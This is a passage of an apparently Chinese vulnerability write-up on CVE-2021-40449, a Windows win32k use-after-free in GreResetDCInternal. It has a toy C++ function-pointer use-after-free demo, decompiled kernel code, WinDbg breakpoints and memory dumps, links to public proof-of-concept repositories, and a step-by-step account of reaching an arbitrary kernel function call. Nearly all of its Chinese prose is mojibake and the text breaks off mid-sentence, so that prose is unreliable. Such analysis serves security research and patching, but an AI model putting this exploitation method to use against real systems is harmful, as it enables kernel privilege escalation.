ä¸€ï¼›å½“å¼•ç”¨å¤±æ•ˆæ—¶ï¼Œè®¡æ•°å™¨å€¼å°±å‡ä¸€ï¼›ä»»ä½•æ—¶åˆ»è®¡æ•°å™¨ä¸ºé›¶çš„å¯¹è±¡å°±æ˜¯ä¸å¯èƒ½å†è¢«ä½¿ç”¨çš„ã€‚\nå¥æŸ„ï¼šç”±äºå†…æ ¸å¯¹è±¡åªèƒ½ç”±å†…æ ¸åˆ†é…ã€è®¿é—®ã€ä¿®æ”¹ï¼Œå½“ring 3å±‚çš„åº”ç”¨ç¨‹åºæƒ³è¦æ“ä½œè¿™äº›å†…æ ¸å¯¹è±¡çš„æ—¶å€™ï¼Œå¹¶ä¸èƒ½ç›´æ¥æ“æ§å†…æ ¸å¯¹è±¡ã€‚å½“å†…æ ¸å¯¹è±¡åˆ›å»ºå¥½åï¼Œæ“ä½œç³»ç»Ÿä¼šä½¿ç”¨ä¸€ä¸ªå¥æŸ„æ¥æ ‡è¯†è¯¥å¯¹è±¡å¹¶è¿”å›ç»™åº”ç”¨ç¨‹åºï¼Œåº”ç”¨ç¨‹åºé€šè¿‡æ“ä½œç³»ç»Ÿæä¾›çš„ring 3å±‚APIæ¥æ“ä½œå¥æŸ„ï¼Œring3å±‚APIç»è¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸ã€‚åœ¨å†…æ ¸å¤„å¥æŸ„å¯¹åº”ç€å…·ä½“çš„å†…æ ¸å¯¹è±¡ï¼Œè¿™æ ·ring3å±‚çš„åº”ç”¨ç¨‹åºå°±å¯ä»¥é€šè¿‡æ“ä½œå¥æŸ„æ¥é—´æ¥æ“ä½œå†…æ ¸å¯¹è±¡ã€‚\nå¥æŸ„è¡¨ï¼šå½“ä¸€ä¸ªè¿›ç¨‹åˆå§‹åŒ–çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šç»™è¯¥è¿›ç¨‹åˆ†é…ä¸€ä¸ªå¥æŸ„è¡¨ï¼Œå½“è¿›ç¨‹åˆ›å»ºå†…æ ¸å¯¹è±¡çš„æ—¶å€™ï¼Œå†…æ ¸åˆ›å»ºå¯¹åº”å†…æ ¸å¯¹è±¡ï¼Œå¹¶éå†è¯¥è¿›ç¨‹çš„å¥æŸ„è¡¨ï¼Œåœ¨å¥æŸ„è¡¨çš„ç©ºé—²ä½ç½®è®¾ç½®å†…æ ¸å¯¹è±¡ã€å¯¹è±¡æŒ‡é’ˆç­‰ï¼Œå¹¶è·å–è¯¥ä½ç½®çš„ç´¢å¼•ï¼Œä½œä¸ºè¿›ç¨‹åˆ›å»ºå¯¹è±¡çš„å‡½æ•°çš„è¿”å›å€¼ï¼Œå³ä¸ºå¥æŸ„ã€‚\nhttps://www.cnblogs.com/MisterXu/p/10846918.html\nDCï¼šæ˜¯ä¸€ä¸ªå†…æ ¸å¯¹è±¡ï¼Œå…¨ç§°device contextï¼Œè®¾å¤‡ä¸Šä¸‹æ–‡å¯¹è±¡\nHDCï¼šDCå¯¹è±¡çš„å¥æŸ„ã€‚\né‡Šæ”¾åé‡ç”¨ï¼šæŒ‡ä¸€ä¸ªå†…å­˜ç©ºé—´è¢«æ“ä½œç³»ç»Ÿé‡Šæ”¾åï¼Œå†…å­˜ç©ºé—´å˜ä¸ºç©ºé—²çŠ¶æ€ï¼Œå¦‚æœç”¨æˆ·åœ¨è¿™ä¸€åˆ»ç”³è¯·å†…å­˜ï¼Œæ“ä½œç³»ç»Ÿä¼šä¼˜å…ˆåˆ†é…åˆšé‡Šæ”¾çš„å†…å­˜ï¼Œåˆ™ç”¨æˆ·å¤§æ¦‚ç‡å¯ä»¥ç”³è¯·åˆ°åˆšåˆšé‡Šæ”¾çš„å†…å­˜å¹¶ä¿®æ”¹è¯¥å†…å­˜ç©ºé—´çš„å†…å®¹ã€‚å¦‚æœåœ¨é‡Šæ”¾ç©ºé—´ä¹‹å‰æœ‰æŒ‡é’ˆæŒ‡å‘è¯¥ç©ºé—´ï¼Œåœ¨é‡Šæ”¾ç©ºé—´ä¹‹åæŒ‡é’ˆå¹¶æœªæŒ‰ç…§ç†æƒ³çŠ¶æ€ç½®ä¸ºNULLï¼Œç”±äºé‡Šæ”¾åå¯ä»¥é‡æ–°ç”³è¯·è¯¥å†…å­˜å¹¶ä¿®æ”¹å†…å­˜å†…å®¹ï¼Œåç»­å¦‚æœç»§ç»­ä½¿ç”¨è¯¥æŒ‡é’ˆï¼Œä½†å†…å­˜å†…å†…å®¹å¹¶ä¸æ˜¯é¢„æœŸçš„é‡Šæ”¾ä¹‹å‰çš„å†…å®¹ï¼Œåˆ™ä¼šäº§ç”Ÿéé¢„æœŸè¡Œä¸ºã€‚\negï¼š\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void method(); void badMethod(); // å®šä¹‰å‡½æ•°æŒ‡é’ˆ typedef void (*function)(); class test { public: function p; test() { } }; int main() { // new testå¯¹è±¡ test *t = new test(); test *p = t; t-\u0026gt;p = method; p-\u0026gt;p(); // é‡Šæ”¾tæŒ‡å‘çš„testå¯¹è±¡çš„ç©ºé—´ delete t; test *pt; for (size_t i = 0; i \u0026lt; 10000; i++) { // å ç”¨åˆšé‡Šæ”¾çš„å¯¹è±¡çš„å†…å­˜ç©ºé—´ pt = (test *)malloc(sizeof(test)); // å°†ç”³è¯·çš„ç©ºé—´å½“ä½œtestå¯¹è±¡ï¼Œå¹¶å°†å¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆè®¾ç½®ä¸ºæ¶æ„å‡½æ•°åœ°å€ pt-\u0026gt;p = badMethod; } // è¿™é‡ŒåŸæ„æƒ³è¦è°ƒç”¨methodå‡½æ•°ï¼Œä½†æ˜¯å®é™…è°ƒç”¨äº†badMethodå‡½æ•° printf(\u0026#34;ç¬¬äºŒæ¬¡è°ƒç”¨\\n\u0026#34;); p-\u0026gt;p(); return 0; } void method() { printf(\u0026#34;method\\n\u0026#34;); } void badMethod() { printf(\u0026#34;bad method\\n\u0026#34;); } æ¼æ´å½¢æˆåˆ†æ è¯¥æ¼æ´äº§ç”Ÿäºwin32kfull!GreResetDCInternalå‡½æ•°ä¸­ï¼Œè¯¥å‡½æ•°å†…ä¼šè·å–DCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆï¼Œå¹¶æ‰§è¡Œè¯¥å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°ï¼Œä½†å¹¶æœªæ£€æŸ¥DCå¯¹è±¡æ˜¯å¦å¼‚å¸¸ã€‚æ‰€ä»¥å¦‚æœå¯ä»¥åœ¨è°ƒç”¨å‡½æ•°æŒ‡é’ˆä¹‹å‰é‡Šæ”¾DCå¯¹è±¡ï¼Œå¹¶é‡æ–°ç”³è¯·è¯¥å¯¹è±¡çš„å†…å­˜ç©ºé—´ï¼Œé€šè¿‡æ„é€ å†…å­˜å¸ƒå±€ï¼Œä¿®æ”¹åŸDCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆæŒ‡å‘å…¶ä»–ä»»æ„å†…æ ¸å‡½æ•°ï¼Œå°±å¯ä»¥åœ¨win32kfull!GreResetDCInternalå†…å®ç°ä»»æ„å†…æ ¸å‡½æ•°è°ƒç”¨ã€‚\næ ¹æ®ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥ç®—å‡ºDCOå¯¹è±¡å’ŒDCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆçš„å…³ç³»ï¼šfunction pointer=* (* (DCO +0x30)+0xad0)ï¼Œå…¶ä¸­DCO +0x30å³æŒ‡å‘DCå¯¹è±¡çš„æŒ‡é’ˆ\nv10 = *(_QWORD *)(v8 + 48);\nv15 *= * (void (_fastcall * * )(QWORD, _QWORD))(*v10 + 2768);\n__int64 __usercall GreResetDCInternal@\u0026lt;rax\u0026gt;(HDC a1@\u0026lt;rcx\u0026gt;, __int64 a2@\u0026lt;rdx\u0026gt;, int *a3@\u0026lt;r8\u0026gt;) { __int64 v24; // [rsp+50h] [rbp-20h] __int64 v25; // [rsp+60h] [rbp-10h] DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v25, a1); // åˆ©ç”¨æ„é€ å‡½æ•°ä»HDCåˆ›å»ºDCOBJå¯¹è±¡ v8 = v25; Â·Â·Â·Â·Â·Â·Â·Â·Â·Â· v10 = *(_QWORD *)(v8 + 48);\t// èµ‹å€¼ *(_QWORD *)(v10 + 1736) = 0i64; v24 = v11; Â·Â·Â·Â·Â·Â·Â· v9 = *(_QWORD *)(v25 + 512) != 0i64; v12 = *(_DWORD *)(v25 + 120) \u0026gt; 0; Â·Â·Â·Â·Â·Â·Â· v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// åˆ›å»ºæ–°çš„DCå¯¹è±¡ï¼Œè¿”å›å¯¹åº”çš„HDCå¥æŸ„ if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));// è°ƒç”¨å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°ï¼Œä¼ å…¥å‚æ•°ä¸ºç”¨æˆ·ä¼ å…¥çš„HDCå¯¹åº”çš„DCå¯¹è±¡å†…çš„å€¼ Â·Â·Â·Â·Â·Â·Â· HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// äº¤æ¢æ—§çš„å’Œæ–°çš„HDCå¯¹è±¡ GreReleaseHmgrSemaphore(); Â·Â·Â·Â·Â·Â· bDeleteDCInternal(v6, 1i64, 0i64); // ä¼ å…¥äº†hdcOpenDCWè¿”å›çš„HDCï¼Œä½†HmgSwapLockedHandleContentsäº¤æ¢äº†æ–°æ—§å¥æŸ„å¯¹åº”çš„DCå¯¹è±¡ï¼Œæ­¤æ—¶v6å¥æŸ„å¯¹åº”æ—§DCå¯¹è±¡ã€‚ Â·Â·Â·Â·Â·Â· è°ƒç”¨è¯¥å‡½æ•°æŒ‡é’ˆçš„æ—¶å€™ï¼Œæ‰€ç”¨çš„ä¸¤ä¸ªå‚æ•°ä¹Ÿæ˜¯æºäºç”¨æˆ·ä¼ å…¥çš„HDCå¥æŸ„å¯¹åº”çš„DCå¯¹è±¡ã€‚\nv10 = *(_QWORD *)(v8 + 48);\t_\n_v14[308] = *(_QWORD *)(v25 + 2464);\nv14[309] = *(_QWORD *)(v25 + 2472);\nv15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));\nåœ¨win32kfull!GreResetDCInternalå‡½æ•°çš„ååŠæ®µä¼šè°ƒç”¨win32kbase!DeleteDCInternalå‡½æ•°é‡Šæ”¾ä¼ å…¥è¯¥å‡½æ•°çš„HDCå¥æŸ„æ‰€å¯¹åº”çš„DCå¯¹è±¡ï¼Œåˆ°è¿™é‡Œå°±è¾¾æˆäº†use-after-freeçš„freeæ­¥éª¤ã€‚\nHDC v3; v3=a1; v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// åˆ›å»ºæ–°çš„HDC v6 = v13; if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64)); GreAcquireHmgrSemaphore(); LOBYTE(v23) = 1; HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// äº¤æ¢æ—§çš„å’Œæ–°çš„HDCå¯¹è±¡ GreReleaseHmgrSemaphore(); Â·Â·Â·Â·Â·Â·Â· // åˆ é™¤HDCå¥æŸ„å¯¹åº”çš„DCå¯¹è±¡ã€‚ bDeleteDCInternal(v6, 1i64, 0i64); å¦‚æœåœ¨é‡Šæ”¾DCå¯¹è±¡ä¹‹åï¼Œé‡æ–°ç”³è¯·DCå¯¹è±¡ç©ºé—´ï¼Œä¿®æ”¹é‡Œé¢çš„å‡½æ•°æŒ‡é’ˆå†…å®¹ï¼Œå¹¶é€šè¿‡æŸäº›æ­¥éª¤ï¼Œè®©å†…æ ¸æ‰§è¡ŒDCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆï¼Œå³å¯è¾¾åˆ°useæ­¥éª¤è®©å†…æ ¸æ‰§è¡Œä»»æ„å†…æ ¸å‡½æ•°ã€‚\næ¼æ´åˆ©ç”¨åˆ†æ POC:\rhttps://github.com/KaLendsi/CVE-2021-40449-Exploit\nPOCä»£ç åˆ†æï¼š\rhttps://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp\nè¦åˆ©ç”¨è¯¥æ¼æ´ï¼Œéš¾ç‚¹åœ¨äºfree DCå¯¹è±¡ä¹‹åæ€ä¹ˆä½¿å¾—å†…æ ¸å†æ¬¡è°ƒç”¨DCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆï¼Œåœ¨æ­£å¸¸GreResetDCInternalå‡½æ•°æµç¨‹ä¸­ï¼Œæ˜¯å…ˆè°ƒç”¨DCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆå†åˆ é™¤è¿™ä¸ªå¯¹è±¡ï¼Œå³æŒ‰ç…§æ­£å¸¸æµç¨‹å³ä¸ä¼šæœ‰use-after-freeçš„æ¡ä»¶ã€‚\nåœ¨ring 3å±‚è°ƒç”¨ResetDCå‡½æ•°ä¼šé€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸è°ƒç”¨å‡½æ•°NtGdiResetDCï¼Œåœ¨NtGdiResetDCä¼šè°ƒç”¨æ¼æ´å‡½æ•°GreResetDCInternalï¼Œåœ¨GreResetDCInternalä¸­ä¼šè°ƒç”¨DCå¯¹è±¡é‡Œé¢çš„å‡½æ•°æŒ‡é’ˆã€‚è¦åˆ©ç”¨è¯¥æ¼æ´å³è¦åœ¨è°ƒç”¨å‡½æ•°æŒ‡é’ˆä¹‹å‰å®Œæˆä¸‰æ­¥åŠ¨ä½œï¼š1ã€é‡Šæ”¾DCå¯¹è±¡2ã€é‡æ–°ç”³è¯·åŸDCå¯¹è±¡çš„å†…å­˜ç©ºé—´3ã€å®Œæˆå†…å­˜ç©ºé—´çš„å¸ƒå±€ã€‚\nåœ¨å‡½æ•°GreResetDCInternalè°ƒç”¨DCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆä¹‹å‰ä¼šè°ƒç”¨win32kbase!hdcOpenDCWå‡½æ•°ã€‚win32kbase!hdcOpenDCWå‡½æ•°ä¼šæ‰§è¡Œæ‰“å°æœºé©±åŠ¨çš„ç”¨æˆ·æ€å›è°ƒå‡½æ•°è¡¨é‡Œé¢çš„å‡½æ•°ï¼Œè¯¥è¡¨é‡Œé¢å­˜æ”¾äº†å‡½æ•°æŒ‡é’ˆï¼Œè¯¥å‡½æ•°æŒ‡é’ˆåŸå…ˆæŒ‡å‘çš„æ˜¯é¢„å®šä¹‰çš„å›è°ƒå‡½æ•°ã€‚åœ¨POCä¸­è¦†ç›–è¿™ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œä½¿å…¶æ‰§è¡ŒPOCå®šä¹‰çš„å›è°ƒå‡½æ•°ã€‚\nåœ¨è‡ªå®šä¹‰å›è°ƒå‡½æ•°ä¸­å†æ¬¡æ‰§è¡ŒResetDCå‡½æ•°å¹¶ä¼ å…¥åŒä¸€HDCå¥æŸ„ï¼Œåˆ™ä¼šå†æ¬¡æ‰§è¡ŒNtGdiResetDCå’ŒGreResetDCInternalå‡½æ•°ï¼Œè€Œåœ¨GreResetDCInternalçš„ååŠæ®µï¼Œä¼šé‡Šæ”¾ä¼ å…¥çš„HDCå¯¹åº”çš„DCå¯¹è±¡å¹¶åˆ›å»ºæ–°çš„DCå¯¹è±¡ã€‚æ­¤æ—¶è¾¾åˆ°äº†freeæ­¥éª¤ã€‚\nåœ¨ç¬¬äºŒæ¬¡ResetDCè°ƒç”¨å®Œæˆåï¼ŒåŸDCå¯¹è±¡å·²è¢«é‡Šæ”¾ï¼Œæ­¤æ—¶å¯ä»¥é‡æ–°ç”³è¯·åŸDCå¯¹è±¡çš„å†…å­˜ç©ºé—´å¹¶å®Œæˆå†…å­˜å¸ƒå±€ï¼Œå°†åŸDCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆå’Œå‡½æ•°æŒ‡é’ˆçš„å‚æ•°çš„ä½ç½®è®¾ç½®ä¸ºæƒ³è¦æ‰§è¡Œçš„å†…æ ¸å‡½æ•°çš„åœ°å€åŠå‚æ•°ã€‚åœ¨æ‰§è¡Œå®Œç¬¬ä¸€æ¬¡å›è°ƒä¹‹åï¼ŒGreResetDCInternal å°†è°ƒç”¨åŸDCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆï¼Œå³å®Œæˆäº†ä»»æ„å†…æ ¸å‡½æ•°è°ƒç”¨ï¼Œæ­¤æ—¶è¾¾åˆ°äº†useæ­¥éª¤ã€‚\nå®Œæ•´è°ƒç”¨é“¾å¦‚ä¸‹å›¾ï¼š\nå…¶ä¸­æ¼æ´ç›¸å…³çš„ç±»å®šä¹‰å¦‚ä¸‹ï¼Œå‚è€ƒhttps://github.com/ZoloZiak/WinNT4/blob/master/private/ntos/w32/ntgdi/gre/dcobj.hxx#L97\nclass DCLEVEL { public: ... HDC hdcSave; ... } class DC : public OBJECT { public: DHPDEV dhpdev_; PDEV *ppdev_; ... HDC hdcNext_; // HDCé“¾è¡¨æŒ‡é’ˆ HDC hdcPrev_; ... DCLEVEL dclevel ... }; typedef DC *PDC; class XDCOBJ /* dco */ { public: PDC pdc; ... }; typedef XDCOBJ *PXDCOBJ; class DCOBJ : public XDCOBJ /* mdo */ { public: DCOBJ() { pdc = (PDC) NULL; } DCOBJ(HDC hdc) { vLock(hdc); } ~DCOBJ() { vUnlockNoNullSet(); } }; typedef DCOBJ *PDCOBJ; ç±»ä¹‹é—´çš„å…³ç³»å¯ä»¥ç®€åŒ–ä¸ºä¸‹å›¾ï¼š\nè°ƒè¯• freeéƒ¨åˆ† åœ¨freeéƒ¨åˆ†éœ€è¦æŠŠæˆ‘ä»¬æƒ³è¦é‡Šæ”¾çš„å†…å­˜ç©ºé—´é‡Šæ”¾ï¼Œå¹¶è®©åé¢çš„useéƒ¨åˆ†æˆåŠŸç”³è¯·åˆ°è¿™å—å†…å­˜ç©ºé—´ã€‚\nè°ƒè¯•ç¯å¢ƒï¼šè™šæ‹Ÿæœºwindows 10 1607ã€ç‰©ç†æœºwindows 10 2004\nPOC:\rhttps://github.com/KaLendsi/CVE-2021-40449-Exploit\næ–­ç‚¹:\nbp win32kfull!NtGdiResetDC bp win32kfull!NtGdiResetDC+0xc1 \u0026#34;è°ƒç”¨GreResetDCInternalå‡½æ•°\u0026#34; bp win32kfull!GreResetDCInternal+0x3a \u0026#34;è°ƒç”¨DCOBJæ„é€ å‡½æ•°\u0026#34; bp win32kfull!GreResetDCInternal+0x116 \u0026#34;è°ƒç”¨_imp_hdcOpenDCWå‡½æ•°\u0026#34; bp win32kfull!GreResetDCInternal+0x136 \u0026#34;ç¬¬äºŒæ¬¡DCOBJ\u0026#34; bp win32kfull!GreResetDCInternal+0x1b5 \u0026#34;è°ƒç”¨DCå¯¹è±¡å‡½æ•°æŒ‡é’ˆ\u0026#34; bp win32kfull!GreResetDCInternal+0x1d1 \u0026#34;è°ƒç”¨HmgSwapLockedHandleå‡½æ•°\u0026#34; bp win32kfull!GreResetDCInternal+0x20d \u0026#34;è°ƒç”¨_imp_bDeleteDCInternalå‡½æ•°\u0026#34; bp cve_2021_40449!hook_DrvEnablePDEV+0x12a \u0026#34;å¾ªç¯è°ƒç”¨\u0026#34; bp win32kbase!PALMEMOBJ::bCreatePalette \u0026#34;è°ƒç”¨win32kbase!PALMEMOBJ::bCreatePalette\u0026#34; è¿è¡ŒPOCï¼Œæ–­ç‚¹bp win32kfull!NtGdiResetDCè§¦å‘æ­¤æ—¶ä¼ å…¥çš„å¥æŸ„ä¸ºrcx=00000000092105f1\nç¬¬ä¸€æ¬¡è°ƒç”¨win32kfull!GreResetDCInternal æ—¶ä¼ å…¥å„ä¸ªå‚æ•°ä¸ºrcx=00000000092105f1 rdx=0000000000000000 r8=ffffb101aadf2a44 å³ç¬¬ä¸€ä¸ªå¥æŸ„å€¼ä¸º00000000092105f1\nç¬¬ä¸€æ¬¡è°ƒç”¨æ„é€ å‡½æ•°ï¼Œåˆ©ç”¨DCå¯¹è±¡åˆ›å»ºDCOå¯¹è±¡ï¼Œæ­¤æ—¶rbxå­˜æ”¾DCOå¯¹è±¡çš„åœ°å€ï¼Œ\næ ¹æ®æ¼æ´å½¢æˆåˆ†æçš„è®¡ç®—å…¬å¼ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„å¾—åˆ°DCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°çš„åœ°å€ä¸ºï¼šffffd548a1f10c30\n1: kd\u0026gt; dq rax ffffb101`aadf29c0 ffffd50e`041fd010 00000000`00000001 ffffb101`aadf29d0 00000268`6e766b20 000000d7`97aff680 ffffb101`aadf29e0 00000000`00000000 00000000`092105f1 ffffb101`aadf29f0 00000000`00000000 ffffd50e`041fb030 ffffb101`aadf2a00 ffffb101`aadf2b80 ffffd548`a1f18fe6 ffffb101`aadf2a10 00000000`00000001 00000000`00000000 ffffb101`aadf2a20 ffffb101`aadf2a44 ffffd50e`041fb030 ffffb101`aadf2a30 000000d7`97aff5d0 00000000`00000000 // rbxå­˜æ”¾äº†æ„é€ å‡½æ•°äº§ç”Ÿçš„DCOå¯¹è±¡åœ°å€ 1: kd\u0026gt; dq rbx ffffd50e`041fd010 00000000`092105f1 80000001`00000000 ffffd50e`041fd020 ffffd800`b45ad780 00000268`6e75ea10 ffffd50e`041fd030 00100010`00000000 00000000`00000000 ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ffffd50e`041fd050 ffffd800`b56f1260 00000009`1000a01f ffffd50e`041fd060 ffffd50e`041fd3d0 00000000`0088000b ffffd50e`041fd070 ffffd50e`000004f0 ffffd50e`00005d90 ffffd50e`041fd080 00000001`00000000 00000000`00000000 // ffffd50e`041fd010ä¸ºrbxçš„å€¼ï¼Œæ­¤å¤„ffffd50e`041fd010+0x30ä¸ºPDCçš„åœ°å€ï¼ŒPDCæŒ‡å‘DCå¯¹è±¡å³DCå¯¹è±¡åœ°å€ä¸ºffffd50e`00052030 // è®¡ç®—å…¬å¼ *(dcoåœ°å€+0x30)=dcåœ°å€ 1: kd\u0026gt; dq ffffd50e`041fd010+0x30 ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ffffd50e`041fd050 ffffd800`b56f1260 00000009`1000a01f ffffd50e`041fd060 ffffd50e`041fd3d0 00000000`0088000b ffffd50e`041fd070 ffffd50e`000004f0 ffffd50e`00005d90 ffffd50e`041fd080 00000001`00000000 00000000`00000000 ffffd50e`041fd090 00000000`00000000 00000000`00000000 ffffd50e`041fd0a0 ffffd50e`00001a10 ffffd50e`00004cb0 ffffd50e`041fd0b0 ffffd50e`000105f0 00000000`00000000 // ffffd50e`00052030+0xad0å¤„ä¸ºDCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘äº†ä¸€ä¸ªå‡½æ•° // è®¡ç®—å…¬å¼ *(dcåœ°å€ +0xad0)=å‡½æ•°åœ°å€ 1: kd\u0026gt; dq ffffd50e`00052030+0xad0 ffffd50e`00052b00 ffffd548`a1f10c30 ffffd548`a1db18c0 ffffd50e`00052b10 00000000`00000000 00000000`00000000 ffffd50e`00052b20 00000000`00000000 ffffd548`a1f10930 ffffd50e`00052b30 00000000`00000000 ffffd548`a1f11dc0 ffffd50e`00052b40 ffffd548`a1f0e6b0 ffffd548`a1f11b00 ffffd50e`00052b50 00000000`00000000 ffffd548`a1f0cd70 ffffd50e`00052b60 ffffd548`a1f0d1f0 ffffd548`a1f112f0 ffffd50e`00052b70 00000000`00000000 00000000`00000000 // ä»¥ä¸‹ä¸ºå‡½æ•°çš„æ±‡ç¼– 1: kd\u0026gt; u ffffd548`a1f10c30 win32kfull!UMPDDrvResetPDEV: ffffd548`a1f10c30 48895c2418 mov qword ptr [rsp+18h],rbx ffffd548`a1f10c35 4889742420 mov qword ptr [rsp+20h],rsi ffffd548`a1f10c3a 57 push rdi ffffd548`a1f10c3b 4883ec70 sub rsp,70h ffffd548`a1f10c3f 488b05ba440800 mov rax,qword ptr [win32kfull!_security_cookie (ffffd548`a1f95100)] ffffd548`a1f10c46 4833c4 xor rax,rsp ffffd548`a1f10c49 4889442468 mov qword ptr [rsp+68h],rax ffffd548`a1f10c4e 488bf9 mov rdi,rcx ä¹‹åé€šè¿‡hdcOpenDCWå‡½æ•°è°ƒç”¨ç”¨æˆ·æ¨¡å¼çš„å›è°ƒå‡½æ•°ï¼Œåœ¨å›è°ƒå‡½æ•°ä¸­å†æ¬¡è°ƒç”¨ResetDCå‡½æ•°ï¼Œæ­¤æ—¶ä¼ å…¥çš„HDCå’Œç¬¬ä¸€æ¬¡è°ƒç”¨ResetDCçš„æ˜¯åŒä¸€ä¸ªå¥æŸ„ã€‚\nç¬¬äºŒæ¬¡è°ƒç”¨win32kfull!GreResetDCInternal æ—¶ï¼Œä¼ å…¥åŒä¸€ä¸ªHDCå¥æŸ„ï¼Œå³å¯¹åº”åŒä¸€ä¸ªDCå¯¹è±¡ã€‚\n0: kd\u0026gt; t win32kfull!GreResetDCInternal: ffffd548`a1f03e58 488bc4 mov rax,rsp 1: kd\u0026gt; rrcx rcx=00000000092105f1 ç¬¬äºŒæ¬¡è°ƒç”¨DCOBJæ„é€ å‡½æ•°æ—¶ï¼Œç”±äºä¼ å…¥çš„æ˜¯åŒä¸€ä¸ªHDCå¥æŸ„ï¼Œæ‰€ä»¥HDCå¥æŸ„å¼•ç”¨æ¬¡æ•°+1ï¼ŒåŒæ—¶ä¸¤æ¬¡è°ƒç”¨æ„é€ å‡½æ•°æ„é€ çš„å¯¹è±¡å…³è”åˆ°åŒä¸€ä¸ªDCå¯¹è±¡ã€‚\nä¹‹åç¬¬äºŒæ¬¡è°ƒç”¨win32kfull!_imp_hdcOpenDCWå‡½æ•°ï¼Œåœ¨è¯¥å‡½æ•°å†…æ‰§è¡Œæ”¿ç­–å›è°ƒå‡½æ•°ï¼Œwin32kfull!imp_hdcOpenDCWè¿”å›ä¸€ä¸ªHDCå¥æŸ„å€¼ä¸º0000000003210041ï¼Œå³åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„DCå¯¹è±¡ã€‚ä¹‹åé€šè¿‡æ–°åˆ›å»ºçš„DCå¯¹è±¡åˆ›å»ºDCOå¯¹è±¡ã€‚\nåœ¨win32kfull!GreResetDCInternalååŠæ®µä¼šè°ƒç”¨win32kfull!_imp_HmgSwapLockedHandleContentsäº¤æ¢ç¬¬ä¸€ä¸ªHDCå¥æŸ„å’Œç¬¬äºŒæ¬¡è°ƒç”¨win32kfull!imp_hdcOpenDCWåˆ›å»ºçš„HDCå¥æŸ„ã€‚\nè°ƒç”¨win32kfull!_imp_HmgSwapLockedHandleContentsä¹‹åä¸¤ä¸ªå¥æŸ„å¯¹åº”çš„DCå†…å®¹ä¸ºå·²ç»å‘ç”Ÿäº†äº¤æ¢\n// ä»¥ä¸‹å†…å®¹ä¸ºæ—§DCå¯¹è±¡ï¼Œä½†æ˜¯å¥æŸ„ä¸ºæ–°å¥æŸ„ 1: kd\u0026gt; dq ffffd50e041fd010 ffffd50e`041fd010 00000000`03210041 80000001`00000000 ...... 1: kd\u0026gt; dq ffffd50e03fee010 // ä»¥ä¸‹å†…å®¹ä¸ºæ–°DCå¯¹è±¡ï¼Œä½†å¥æŸ„ä¸ºæ—§å¥æŸ„ ffffd50e`03fee010 00000000`092105f1 80000002`00000000 ...... ä¹‹åè°ƒç”¨win32kfull!_imp_bDeleteDCInternalä¼ å…¥HDCå¥æŸ„ï¼Œè¯¥å‡½æ•°ä¼šé‡Šæ”¾HDCå¥æŸ„å¯¹åº”çš„DCå¯¹è±¡ï¼Œè€Œæ­¤æ—¶ä¼ 